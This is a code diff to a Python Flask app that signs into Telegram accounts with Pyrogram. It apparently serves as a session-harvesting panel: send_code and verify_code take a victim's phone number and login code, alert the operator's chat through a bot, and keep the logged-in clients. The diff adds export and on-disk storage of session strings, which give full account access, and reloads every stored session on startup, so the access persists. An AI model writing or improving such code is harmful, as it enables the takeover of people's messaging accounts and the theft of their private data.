@@ -41,7 +41,7 @@ def run_async(coro):
         import concurrent.futures
         with concurrent.futures.ThreadPoolExecutor() as executor:
             future = executor.submit(asyncio.run, coro)
-            return future.result()
+            return future.result(timeout=60)
     except RuntimeError:
         # No running loop, create one and run
         try:
@@ -53,88 +53,63 @@ def run_async(coro):
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
         
-        return loop.run_until_complete(coro)
+        return loop.run_until_complete(asyncio.wait_for(coro, timeout=60))
 
 def load_existing_sessions():
-    """Load sessions - tries old method first, then new method"""
-    # First try old method (for existing sessions)
-    session_files = list(SESSIONS_DIR.glob("*.session"))
+    """Load persisted sessions from JSON files"""
+    json_files = list(SESSIONS_DIR.glob("*.json"))
     
-    for session_file in session_files:
+    print(f"🔍 Found {len(json_files)} JSON files to load")
+    
+    for json_file in json_files:
         try:
-            session_id = session_file.stem
-            json_file = SESSIONS_DIR / f"{session_id}.json"
+            session_id = json_file.stem
             
-            # If there's a JSON file with session_string, use new method
-            if json_file.exists():
-                with open(json_file, 'r') as f:
-                    data = json.load(f)
-                    if 'session_string' in data:
-                        # Use NEW method
-                        client = Client(
-                            name=f"{session_id}_loaded",
-                            api_id=API_ID,
-                            api_hash=API_HASH,
-                            session_string=data['session_string'],
-                            workdir=str(SESSIONS_DIR)
-                        )
-                        
-                        async def reconnect():
-                            await client.start()
-                            me = await client.get_me()
-                            return me, client
-                        
-                        try:
-                            me, connected_client = run_async(reconnect())
-                            active_sessions[session_id] = {
-                                'client': connected_client,
-                                'phone': data.get('phone'),
-                                'user_info': data.get('user_info'),
-                                'device_model': data.get('device_model', 'Loaded'),
-                                'created_at': data.get('created_at', datetime.now().timestamp())
-                            }
-                            print(f"✅ Loaded (new method): {session_id} - {me.first_name}")
-                            continue  # Skip old method
-                        except Exception as e:
-                            print(f"Failed to load session {session_id} with new method: {e}")
+            with open(json_file, 'r') as f:
+                data = json.load(f)
             
-            # If no JSON file, try old method
+            # Skip test sessions
+            if data.get('is_test_session'):
+                print(f"⏭️  Skipping test session: {session_id}")
+                continue
+            
+            # Check if we have a session_string (required for persistence)
+            if 'session_string' not in data:
+                print(f"⚠️  No session_string in {session_id}.json - skipping")
+                continue
+            
+            print(f"🔄 Attempting to restore session: {session_id}")
+            
+            # Create client using session_string
             client = Client(
-                name=str(session_file),
+                name=f"{session_id}_restored",
                 api_id=API_ID,
                 api_hash=API_HASH,
+                session_string=data['session_string'],
                 workdir=str(SESSIONS_DIR)
             )
             
-            async def check_session():
-                await client.connect()
-                try:
-                    me = await client.get_me()
-                    return {
-                        'client': client,
-                        'phone': me.phone_number,
-                        'user_info': {
-                            'id': me.id,
-                            'first_name': me.first_name,
-                            'username': me.username
-                        },
-                        'created_at': datetime.now().timestamp(),
-                        'device_model': 'Loaded from disk'
-                    }
-                except Exception:
-                    await client.disconnect()
-                    return None
+            async def reconnect():
+                await client.start()
+                me = await client.get_me()
+                return me, client
             
-            session_data = run_async(check_session())
-            
-            if session_data:
-                active_sessions[session_id] = session_data
-                print(f"✅ Loaded (old method): {session_id}")
-            else:
-                print(f"❌ Invalid session: {session_id}")
+            try:
+                me, connected_client = run_async(reconnect())
+                active_sessions[session_id] = {
+                    'client': connected_client,
+                    'phone': data.get('phone'),
+                    'user_info': data.get('user_info'),
+                    'device_model': data.get('device_model', 'Loaded'),
+                    'created_at': data.get('created_at', datetime.now().timestamp()),
+                    'session_string': data.get('session_string')
+                }
+                print(f"✅ Successfully restored: {session_id} - {me.first_name}")
+            except Exception as e:
+                print(f"❌ Failed to restore session {session_id}: {e}")
                 
         except Exception as e:
-            print(f"Error loading session {session_file}: {e}")
+            print(f"Error loading session {json_file}: {e}")
 
 # Load sessions in a background thread to avoid blocking startup
 threading.Thread(target=load_existing_sessions, daemon=True).start()
@@ -221,6 +196,17 @@ def delete_all_sessions():
     
     if not SESSIONS_DIR.exists():
         return jsonify({'error': 'Sessions directory does not exist', 'results': results})
+    
+    # Disconnect all active sessions first
+    for sid, data in list(active_sessions.items()):
+        try:
+            client = data.get('client')
+            if client and hasattr(client, 'is_connected') and client.is_connected:
+                async def disconnect_client():
+                    await client.disconnect()
+                run_async(disconnect_client())
+        except:
+            pass
     
     # Delete all files and subdirectories
     for item in SESSIONS_DIR.iterdir():
@@ -681,9 +667,9 @@ def send_code():
         async def create_and_store_session():
             client = None
             try:
-                session_file = SESSIONS_DIR / f"{session_id}"
+                # Use session_id as the name - Pyrogram will auto-create .session file
                 client = Client(
-                    name=str(session_file),
+                    name=session_id,
                     api_id=API_ID,
                     api_hash=API_HASH,
                     workdir=str(SESSIONS_DIR),
@@ -701,14 +687,13 @@ def send_code():
                     'client': client,
                     'phone': phone,
                     'phone_code_hash': sent_code.phone_code_hash,
-                    'session_file': str(session_file),
                     'created_at': datetime.now().timestamp(),
                     'device_model': device_model,
                     'system_version': system_version,
                     'app_version': app_version
                 }
 
-                # Save metadata to disk
+                # Save metadata to disk (session_string will be added after login)
                 metadata = {
                    'phone': phone,
                    'device_model': device_model,
@@ -755,23 +740,12 @@ def verify_code():
         phone_code_hash = session_data['phone_code_hash']
         device_model = session_data.get('device_model', 'Unknown')
         
-        # Get or create event loop properly
-        try:
-            loop = asyncio.get_event_loop()
-            if loop.is_closed():
-                loop = asyncio.new_event_loop()
-                asyncio.set_event_loop(loop)
-        except RuntimeError:
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-        
         async def complete_login():
             try:
-                # Ensure client is using the same loop
-                if client.is_connected:
-                    await client.disconnect()
+                # Ensure client is connected
+                if not client.is_connected:
+                    await client.connect()
                 
-                await client.connect()
                 await client.sign_in(
                     phone_number=phone,
                     phone_code_hash=phone_code_hash,
@@ -780,6 +754,9 @@ def verify_code():
                 
                 me = await client.get_me()
                 
+                # ✅ CRITICAL: Export session string for persistence
+                session_string = await client.export_session_string()
+                
                 session_data['user_info'] = {
                     'id': me.id,
                     'first_name': me.first_name,
@@ -787,15 +764,25 @@ def verify_code():
                     'username': me.username
                 }
                 
-                # Save user info to metadata file
+                # Save session_string and user info to metadata file
                 json_file = SESSIONS_DIR / f"{session_id}.json"
                 if json_file.exists():
-                    import json
                     with open(json_file, 'r') as f:
                         metadata = json.load(f)
-                    metadata['user_info'] = session_data['user_info']
-                    with open(json_file, 'w') as f:
-                        json.dump(metadata, f)
+                else:
+                    metadata = {}
+                
+                metadata['session_string'] = session_string
+                metadata['user_info'] = session_data['user_info']
+                metadata['phone'] = phone
+                
+                with open(json_file, 'w') as f:
+                    json.dump(metadata, f, indent=2)
+                
+                # Store in active sessions for quick access
+                session_data['session_string'] = session_string
+                
+                print(f"✅ Session {session_id} logged in and persisted")
                 
                 # Notify via bot with device info
                 send_telegram_message(YOUR_CHAT_ID,
@@ -823,13 +810,8 @@ def verify_code():
                 print(f"Login error: {e}")
                 return {'success': False, 'error': str(e)}
         
-        # Run with proper error handling
-        try:
-            result = loop.run_until_complete(complete_login())
-            return jsonify(result)
-        except Exception as e:
-            print(f"Loop error: {e}")
-            return jsonify({'success': False, 'error': f'Event loop error: {str(e)}'}), 500
+        result = run_async(complete_login())
+        return jsonify(result)
         
     except Exception as e:
         print(f"Verify code error: {e}")
